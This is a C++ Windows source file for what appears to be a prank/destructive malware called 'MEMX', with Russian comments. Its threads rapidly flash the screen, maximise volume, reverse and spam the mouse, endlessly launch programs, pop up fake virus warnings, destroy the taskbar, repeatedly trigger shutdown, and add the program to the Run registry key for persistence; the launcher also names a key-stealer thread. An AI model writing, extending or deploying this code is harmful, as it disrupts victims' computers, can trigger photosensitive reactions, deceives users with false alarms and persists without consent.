#include <windows.h>
#include <gdi32.h>
#include <winmm.h>
#include <random>
#include <vector>
#include <string>
#include <cstdio>
#include <ctime>
#include <commctrl.h>
#include <shellapi.h>
#include <shlobj.h>
#include <mmsystem.h>
#include <digitalv.h>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")

extern volatile bool g_running;

int SCREEN_W = 0;
int SCREEN_H = 0;
HWND g_hwnd = NULL;

// ====== 1. CD-ROM OPEN/CLOSE ======
DWORD WINAPI CDRomSpamThread(LPVOID) {
    while (g_running) {
        mciSendStringA("set cdaudio door open", NULL, 0, NULL);
        Sleep(100);
        mciSendStringA("set cdaudio door closed", NULL, 0, NULL);
        Sleep(100);
    }
    return 0;
}

// ====== 2. VOLUME MAX ======
DWORD WINAPI VolumeMaxThread(LPVOID) {
    while (g_running) {
        keybd_event(VK_VOLUME_UP, 0, 0, 0);
        Sleep(50);
        keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0);
        Sleep(100);
    }
    return 0;
}

// ====== 3. SCREEN FLASH ======
DWORD WINAPI ScreenFlashThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    
    while (g_running) {
        HBRUSH brush = CreateSolidBrush(RGB(255, 255, 255));
        RECT rect = {0, 0, SCREEN_W, SCREEN_H};
        FillRect(hdc, &rect, brush);
        DeleteObject(brush);
        Sleep(50);
        
        brush = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(hdc, &rect, brush);
        DeleteObject(brush);
        Sleep(50);
    }
    ReleaseDC(NULL, hdc);
    return 0;
}

// ====== 4. RANDOM WINDOW RESIZE ======
DWORD WINAPI ResizeWindowsThread(LPVOID) {
    while (g_running) {
        HWND hwnd = GetForegroundWindow();
        if (hwnd) {
            int w = rand() % 1000 + 100;
            int h = rand() % 800 + 100;
            SetWindowPos(hwnd, NULL, rand() % 1000, rand() % 600, w, h, SWP_NOZORDER);
        }
        Sleep(50);
    }
    return 0;
}

// ====== 5. TASKBAR HIDE ======
DWORD WINAPI TaskbarHiderThread(LPVOID) {
    HWND hTaskbar = FindWindowA("Shell_TrayWnd", NULL);
    while (g_running) {
        ShowWindow(hTaskbar, SW_HIDE);
        Sleep(1000);
    }
    return 0;
}

// ====== 6. MOUSE REVERSE ======
DWORD WINAPI MouseReverseThread(LPVOID) {
    while (g_running) {
        POINT pt;
        GetCursorPos(&pt);
        SetCursorPos(SCREEN_W - pt.x, SCREEN_H - pt.y);
        Sleep(10);
    }
    return 0;
}

// ====== 7. SCREEN ROTATE ======
DWORD WINAPI ScreenRotateThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdc, SCREEN_W, SCREEN_H);
    SelectObject(memDC, hBitmap);
    
    int angle = 0;
    while (g_running) {
        BitBlt(memDC, 0, 0, SCREEN_W, SCREEN_H, hdc, 0, 0, SRCCOPY);
        
        // Рисуем вращающийся прямоугольник
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
        RECT rect = {
            SCREEN_W/4 + (int)(sin(angle * 3.14 / 180) * SCREEN_W/4),
            SCREEN_H/4 + (int)(cos(angle * 3.14 / 180) * SCREEN_H/4),
            SCREEN_W*3/4 + (int)(sin((angle + 180) * 3.14 / 180) * SCREEN_W/4),
            SCREEN_H*3/4 + (int)(cos((angle + 180) * 3.14 / 180) * SCREEN_H/4)
        };
        FillRect(hdc, &rect, brush);
        DeleteObject(brush);
        
        angle = (angle + 5) % 360;
        Sleep(30);
    }
    
    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    return 0;
}

// ====== 8. START PROGRAMS ======
DWORD WINAPI StartProgramsThread(LPVOID) {
    const char* programs[] = {
        "calc", "notepad", "mspaint", "wordpad", "explorer",
        "cmd", "regedit", "taskmgr", "control", "msinfo32"
    };
    
    while (g_running) {
        const char* prog = programs[rand() % 10];
        char cmd[256];
        sprintf(cmd, "start %s", prog);
        system(cmd);
        Sleep(100);
    }
    return 0;
}

// ====== 9. KEYBOARD LIGHTS ======
DWORD WINAPI KeyboardLightsThread(LPVOID) {
    while (g_running) {
        // Caps Lock
        keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
        keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        Sleep(100);
        // Num Lock
        keybd_event(VK_NUMLOCK, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
        keybd_event(VK_NUMLOCK, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        Sleep(100);
        // Scroll Lock
        keybd_event(VK_SCROLL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
        keybd_event(VK_SCROLL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        Sleep(100);
    }
    return 0;
}

// ====== 10. FAKE VIRUS WARNINGS ======
DWORD WINAPI FakeWarningsThread(LPVOID) {
    const char* messages[] = {
        "VIRUS DETECTED!",
        "SYSTEM CORRUPTED!",
        "MEMX INFECTION!",
        "HARDWARE FAILURE!",
        "KERNEL PANIC!",
        "DATA LOST!",
        "FILES DELETED!",
        "SYSTEM CRASH!"
    };
    
    while (g_running) {
        MessageBoxA(NULL, messages[rand() % 8], "MEMX WARNING", MB_ICONERROR | MB_OK);
        Sleep(500);
    }
    return 0;
}

// ====== 11. DESKTOP CLEANER ======
DWORD WINAPI DesktopCleanerThread(LPVOID) {
    HWND hDesktop = FindWindowA("Progman", NULL);
    if (!hDesktop) hDesktop = FindWindowA("DesktopClass", NULL);
    
    while (g_running) {
        // Скрываем все иконки
        HWND hListView = FindWindowExA(hDesktop, NULL, "SysListView32", NULL);
        if (hListView) {
            ShowWindow(hListView, SW_HIDE);
        }
        Sleep(1000);
        // Показываем обратно
        if (hListView) {
            ShowWindow(hListView, SW_SHOW);
        }
        Sleep(1000);
    }
    return 0;
}

// ====== 12. MOUSE CLICK SPAM ======
DWORD WINAPI ClickSpamThread(LPVOID) {
    while (g_running) {
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
        Sleep(10);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
        Sleep(100);
        
        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
        Sleep(10);
        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
        Sleep(100);
    }
    return 0;
}

// ====== 13. TASKBAR DESTROY ======
DWORD WINAPI TaskbarDestroyThread(LPVOID) {
    HWND hTaskbar = FindWindowA("Shell_TrayWnd", NULL);
    HWND hStart = FindWindowA("Button", NULL);
    
    while (g_running) {
        DestroyWindow(hTaskbar);
        DestroyWindow(hStart);
        Sleep(1000);
    }
    return 0;
}

// ====== 14. SCREEN SHAKE ======
DWORD WINAPI ScreenShakeThread(LPVOID) {
    SCREEN_W = GetSystemMetrics(SM_CXSCREEN);
    SCREEN_H = GetSystemMetrics(SM_CYSCREEN);
    
    while (g_running) {
        for (int i = 0; i < 10; i++) {
            SetWindowPos(GetDesktopWindow(), NULL, 
                rand() % 20 - 10, rand() % 20 - 10, 
                SCREEN_W, SCREEN_H, SWP_NOZORDER);
            Sleep(20);
        }
        Sleep(100);
    }
    return 0;
}

// ====== 15. POWER OFF ATTEMPT ======
DWORD WINAPI PowerOffThread(LPVOID) {
    while (g_running) {
        // Пытаемся выключить
        system("shutdown /s /t 0");
        // Отменяем
        system("shutdown /a");
        Sleep(1000);
    }
    return 0;
}

// ====== 16. STARTUP ADD ======
DWORD WINAPI StartupAddThread(LPVOID) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "MEMX", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
    return 0;
}

// ====== 17. ALL EFFECTS START ======
void StartEffects() {
    srand((unsigned)time(NULL));
    
    // Базовые эффекты
    CreateThread(NULL, 0, InvertScreenThread, NULL, 0, NULL);
    CreateThread(NULL, 0, FlyingCursorThread, NULL, 0, NULL);
    CreateThread(NULL, 0, FloodWindowsThread, NULL, 0, NULL);
    CreateThread(NULL, 0, SoundChaosThread, NULL, 0, NULL);
    CreateThread(NULL, 0, TunnelThread, NULL, 0, NULL);
    CreateThread(NULL, 0, TVNoiseThread, NULL, 0, NULL);
    CreateThread(NULL, 0, MirrorScreenThread, NULL, 0, NULL);
    CreateThread(NULL, 0, KeyStealerThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ShutdownBlockerThread, NULL, 0, NULL);
    CreateThread(NULL, 0, FakeBSODThread, NULL, 0, NULL);
    CreateThread(NULL, 0, WhiteNoiseThread, NULL, 0, NULL);
    CreateThread(NULL, 0, DistortionThread, NULL, 0, NULL);
    
    // Новые ультра эффекты
    CreateThread(NULL, 0, CDRomSpamThread, NULL, 0, NULL);
    CreateThread(NULL, 0, VolumeMaxThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ScreenFlashThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ResizeWindowsThread, NULL, 0, NULL);
    CreateThread(NULL, 0, TaskbarHiderThread, NULL, 0, NULL);
    CreateThread(NULL, 0, MouseReverseThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ScreenRotateThread, NULL, 0, NULL);
    CreateThread(NULL, 0, StartProgramsThread, NULL, 0, NULL);
    CreateThread(NULL, 0, KeyboardLightsThread, NULL, 0, NULL);
    CreateThread(NULL, 0, FakeWarningsThread, NULL, 0, NULL);
    CreateThread(NULL, 0, DesktopCleanerThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ClickSpamThread, NULL, 0, NULL);
    CreateThread(NULL, 0, TaskbarDestroyThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ScreenShakeThread, NULL, 0, NULL);
    CreateThread(NULL, 0, PowerOffThread, NULL, 0, NULL);
    CreateThread(NULL, 0, StartupAddThread, NULL, 0, NULL);
}